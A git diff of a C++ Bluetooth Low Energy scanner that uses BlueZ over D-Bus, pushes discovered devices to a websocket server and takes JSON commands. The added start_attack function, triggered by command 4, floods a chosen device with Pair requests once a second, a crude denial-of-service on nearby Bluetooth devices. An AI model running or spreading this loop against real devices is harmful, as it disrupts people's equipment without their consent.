@@ -36,7 +36,7 @@ bool device_exists(std::vector<FoundBLE> &knownBleObj, std::string &address) {
 
 //This is what currently parses scanned devices
 //Create a class to handle this
-void get_interface_added(DBus::Path path, BLEDeviceInterface other, std::vector<FoundBLE> &knownBleObj, std::mutex &mtx) {
+void get_interface_added(DBus::Path path, BLEDeviceInterface other, std::vector<FoundBLE> &knownBleObj, std::mutex &mtx, Web::WebsocketServer &server) {
     std::cout << "Device at: " << path << " found\n";
     std::map<std::string, std::map<std::string, DBus::Variant>>::iterator it = other.begin();
     std::map<std::string, std::map<std::string, DBus::Variant>>::iterator itEnd = other.end();
@@ -86,7 +86,12 @@ void get_interface_added(DBus::Path path, BLEDeviceInterface other, std::vector<
                     }
 
                     std::cout << "Adding device\n";
+                    std::cout << "Send Device test\n";
+                    bleObj.add_value("add", "true");
+                    char sendData[2000];
+                    int s = bleObj.obj_json(sendData, 2000);
                     mtx.lock();
+                    server.send_data(sendData, s, false);
                     knownBleObj.push_back(bleObj);
                     mtx.unlock();
                     //std::cout << "test size: " << knownBleObj.size() << "\n";
@@ -148,7 +153,7 @@ void get_interface_removed(DBus::Path path, std::vector<std::string>, std::vecto
 
 //Listen for device added signal emmited on dbus
 //massive function definition for creating signal to listen for interfaces added
-std::shared_ptr<DBus::SignalProxy<void(DBus::Path, BLEDeviceInterface)>> listen_for_device_added(std::shared_ptr<DBus::Connection> connection, std::vector<FoundBLE> &foundBleObj, std::mutex &mtx) {
+std::shared_ptr<DBus::SignalProxy<void(DBus::Path, BLEDeviceInterface)>> listen_for_device_added(std::shared_ptr<DBus::Connection> connection, std::vector<FoundBLE> &foundBleObj, std::mutex &mtx, Web::WebsocketServer &server) {
      //Create a listener for the InterfacesAdded signal and call get_interface_added()
      std::shared_ptr<DBus::SignalProxy<void(DBus::Path, BLEDeviceInterface)>> signal = connection->create_free_signal_proxy<void(DBus::Path, BLEDeviceInterface)>(
                     DBus::MatchRuleBuilder::create()
@@ -160,7 +165,7 @@ std::shared_ptr<DBus::SignalProxy<void(DBus::Path, BLEDeviceInterface)>> listen_
     //Create callback function to be called when signal is recieved
     //sigc::bind allows me to pass an additional argument
     //std::ref must be used, otherwise a copy of vector will be passed, instead of a reference
-    signal->connect(sigc::bind(sigc::ptr_fun(&get_interface_added), std::ref(foundBleObj), std::ref(mtx)));
+    signal->connect(sigc::bind(sigc::ptr_fun(&get_interface_added), std::ref(foundBleObj), std::ref(mtx), std::ref(server)));
 
     std::cout << "Running\n" << std::flush;
     return signal;
@@ -171,7 +176,8 @@ std::shared_ptr<DBus::SignalProxy<void(DBus::Path, BLEDeviceInterface)>> listen_
 std::shared_ptr<DBus::SignalProxy<void(DBus::Path, std::vector<std::string>)>> listen_for_device_removed(
             std::shared_ptr<DBus::Connection> connection,
             std::vector<FoundBLE> &foundBleObj,
-            std::mutex &mtx) {
+            std::mutex &mtx,
+            Web::WebsocketServer &server) {
     //Create a listener for InterfacesRemoved signal and call get_interface_removed()
     std::shared_ptr<DBus::SignalProxy<void(DBus::Path, std::vector<std::string>)>> signal = 
         connection->create_free_signal_proxy<void(DBus::Path, std::vector<std::string>)>(
@@ -203,7 +209,7 @@ int uint_to_int(uint8_t num) {
 
 
 //Creats an object to iteract with the ble adapter on this device
-LocalAdapter parse_known_devices(std::shared_ptr<DBus::Connection> connection, BLEDeviceObject &devices, std::vector<FoundBLE> &knownBleDevices, std::mutex &mtx) {
+LocalAdapter parse_known_devices(std::shared_ptr<DBus::Connection> connection, BLEDeviceObject &devices, std::vector<FoundBLE> &knownBleDevices, std::mutex &mtx, Web::WebsocketServer &server) {
     BLEDeviceObject::iterator it = devices.begin();
     BLEDeviceObject::iterator itEnd = devices.end();
 
@@ -228,7 +234,7 @@ LocalAdapter parse_known_devices(std::shared_ptr<DBus::Connection> connection, B
                 break;
             }
             else if(itr->first == "org.bluez.Device1") {
-                get_interface_added(it->first, it->second, knownBleDevices, mtx);
+                get_interface_added(it->first, it->second, knownBleDevices, mtx, server);
                 break;
             }
             ++itr;
@@ -338,9 +344,36 @@ void scan_for_devices(std::atomic_bool &run, LocalAdapter &local, std::vector<Fo
 }
 
 
+void start_attack(std::atomic_bool &attack, JsonObject &cmd, std::shared_ptr<DBus::Connection> &connection) {
+    std::string *path = cmd.get_item("Path")->get_string();
+    //std::shared_ptr<DBus::ObjectProxy> adapterObject = connection->create_object_proxy("org.bluez", local.get_path());
+    std::cout << "Get path test: " << *path << "\n";
+    std::shared_ptr<DBus::ObjectProxy> object = connection->create_object_proxy("org.bluez", *path);
+    DBus::MethodProxy<void()> pair = *(object->create_method<void()>("org.bluez.Device1", "Pair"));
+
+    while(attack) {
+        std::cout << "Attempting pair request\n";
+        pair();
+        sleep(1);
+    }
+}
+
+
 int main() {
     //allocate memory for pointer vector
     std::vector<FoundBLE> knownBleDevices;
+    //create variable to hold commands from websocket site
+    Web::WebsocketServer server(8080);
+
+    //lambda callback for websocket class
+    server.set_threading(true);
+    int bufSize = 2000;
+    uint8_t buf[bufSize];
+    server.set_buffer(bufSize);
+
+    std::cout << "Starting webserver\n";
+    server.begin();
+    sleep(1);
 
     std::mutex mtx;
 
@@ -359,7 +392,7 @@ int main() {
     //return consists of dict of {object path, dict of {string, dict of {string, variant}}}
     DBus::MethodProxy<BLEDeviceObject()>& method_proxy = *(baseObject->create_method<BLEDeviceObject()>("org.freedesktop.DBus.ObjectManager", "GetManagedObjects"));
     BLEDeviceObject answer = method_proxy();
-    LocalAdapter local = parse_known_devices(connection, answer, knownBleDevices, mtx);
+    LocalAdapter local = parse_known_devices(connection, answer, knownBleDevices, mtx, server);
 
     //parse info from answer. Get local adapter object 
     std::cout << "Get path test: " << local.get_path() << "\n";
@@ -369,25 +402,13 @@ int main() {
         std::shared_ptr<DBus::ObjectProxy> adapterObject = connection->create_object_proxy("org.bluez", local.get_path());
 
         //create listener for device added
-        std::shared_ptr<DBus::SignalProxy<void(DBus::Path, BLEDeviceInterface)>> addSignal = listen_for_device_added(connection, knownBleDevices, mtx);
+        std::shared_ptr<DBus::SignalProxy<void(DBus::Path, BLEDeviceInterface)>> addSignal = listen_for_device_added(connection, knownBleDevices, mtx, server);
        
         //Add reciever to listen for device removed signal
-        std::shared_ptr<DBus::SignalProxy<void(DBus::Path, std::vector<std::string>)>> removeSignal = listen_for_device_removed(connection, knownBleDevices, mtx); 
+        std::shared_ptr<DBus::SignalProxy<void(DBus::Path, std::vector<std::string>)>> removeSignal = listen_for_device_removed(connection, knownBleDevices, mtx, server); 
 
-        //create variable to hold commands from websocket site
-        Web::WebsocketServer server(8080);
-
-        //lambda callback for websocket class
-        server.set_threading(true);
 
         //create buffer to recieve messages from site
-        int bufSize = 2000;
-        uint8_t buf[bufSize];
-        server.set_buffer(bufSize);
-
-        std::cout << "Starting webserver\n";
-        server.begin();
-        sleep(1);
 
         //listen for websocket events
         //rework listener so instead of just looping infinantly, use condition variable to wait for thread to return value
@@ -401,6 +422,7 @@ int main() {
             //int cmd = uint_to_int(buf[0]);
             std::cout << "Buffer test: " << buf << "\n";
             JsonObject jsonCmd(buf, msgLen);
+            std::cout << "Post json test\n";
             int cmd = jsonCmd.get_item("command")->get_float();
             //Find a way to created detached threads
             ThreadPool pool(ATTACK_THREADS);
@@ -428,7 +450,9 @@ int main() {
                     break;
                 }
                 case 4: { //start attack
-
+                    local.stop_scan();
+                    attack = true;
+                    start_attack(attack, jsonCmd, connection);
                     break;
                 }
                 case 5: { //end program execution
